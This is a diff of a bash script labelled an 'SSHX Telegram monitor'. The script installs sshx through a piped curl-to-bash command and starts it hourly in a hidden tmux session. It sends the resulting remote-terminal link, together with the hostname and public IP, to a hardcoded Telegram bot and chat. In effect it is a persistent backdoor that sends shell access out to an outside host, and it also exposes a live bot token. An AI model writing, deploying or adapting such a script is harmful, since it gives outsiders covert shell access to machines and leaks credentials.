@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# SSHX → TELEGRAM MONITOR (FINAL)
+# SSHX TELEGRAM MONITOR - STABLE VERSION
 # ============================================
 
 set -e
@@ -8,14 +8,14 @@ set -e
 BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
 CHAT_ID="-1003847935504"
 
-log(){ echo "[INFO] $1"; }
-
 send_telegram(){
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 -d "chat_id=$CHAT_ID" \
 -d "text=$1" \
 -d "parse_mode=HTML" > /dev/null
 }
+
+log(){ echo "[INFO] $1"; }
 
 # ============================================
 # DETECT OS
@@ -29,35 +29,43 @@ OS=$ID
 fi
 
 case $OS in
+
 ubuntu|debian)
-PKG_UPDATE="apt-get update -y"
-PKG_INSTALL="apt-get install -y"
+UPDATE="apt-get update -y"
+INSTALL="apt-get install -y"
+UTIL="util-linux"
 ;;
 
 centos|rhel|almalinux)
-PKG_UPDATE="yum makecache -y"
-PKG_INSTALL="yum install -y"
+UPDATE="yum makecache -y"
+INSTALL="yum install -y"
+UTIL="util-linux"
 ;;
 
 fedora)
-PKG_UPDATE="dnf makecache -y"
-PKG_INSTALL="dnf install -y"
+UPDATE="dnf makecache -y"
+INSTALL="dnf install -y"
+UTIL="util-linux"
 ;;
 
 alpine)
-PKG_UPDATE=""
-PKG_INSTALL="apk add"
+UPDATE=""
+INSTALL="apk add"
+UTIL="util-linux"
 ;;
 
 arch)
-PKG_UPDATE="pacman -Sy"
-PKG_INSTALL="pacman -S --noconfirm"
+UPDATE="pacman -Sy"
+INSTALL="pacman -S --noconfirm"
+UTIL="util-linux"
 ;;
 
 *)
-PKG_UPDATE="apt-get update -y"
-PKG_INSTALL="apt-get install -y"
+UPDATE="apt-get update -y"
+INSTALL="apt-get install -y"
+UTIL="util-linux"
 ;;
+
 esac
 
 }
@@ -68,13 +76,14 @@ esac
 
 install_deps(){
 
-[ -n "$PKG_UPDATE" ] && $PKG_UPDATE
+[ -n "$UPDATE" ] && $UPDATE
 
-command -v curl >/dev/null || $PKG_INSTALL curl
-command -v tmux >/dev/null || $PKG_INSTALL tmux
+command -v curl >/dev/null || $INSTALL curl
+command -v tmux >/dev/null || $INSTALL tmux
+command -v script >/dev/null || $INSTALL $UTIL
 
 if ! command -v sshx >/dev/null; then
-log "install sshx"
+log "Installing sshx..."
 curl -fsSL https://sshx.io/get | bash
 fi
 
@@ -101,32 +110,32 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 -d "parse_mode=HTML" > /dev/null
 }
 
-report(){
+run(){
 
 HOST=$(hostname)
 IP=$(curl -s ifconfig.me)
-DATE=$(date)
+TIME=$(date)
 
-OUTPUT=$(sshx --quiet 2>&1)
+# run sshx with pseudo terminal
+OUTPUT=$(timeout 10 script -q -c "sshx" /dev/null 2>&1)
 
-MSG="🔥 <b>SSHX SESSION</b>
-
+MSG="✅ <b>SSHX MONITOR STARTED</b>
 Host: $HOST
 IP: $IP
-Time: $DATE
+Time: $TIME
 
-<code>$OUTPUT</code>"
+<pre>$OUTPUT</pre>"
 
 send "$MSG"
 
 }
 
-report
+run
 
 while true
 do
 sleep 3600
-report
+run
 done
 
 EOF
@@ -157,7 +166,7 @@ install_deps
 create_monitor
 run_tmux
 
-send_telegram "✅ <b>SSHX MONITOR STARTED</b>
+send_telegram "🚀 <b>SSHX MONITOR INSTALLED</b>
 Host: $(hostname)
 IP: $(curl -s ifconfig.me)
 Time: $(date)"
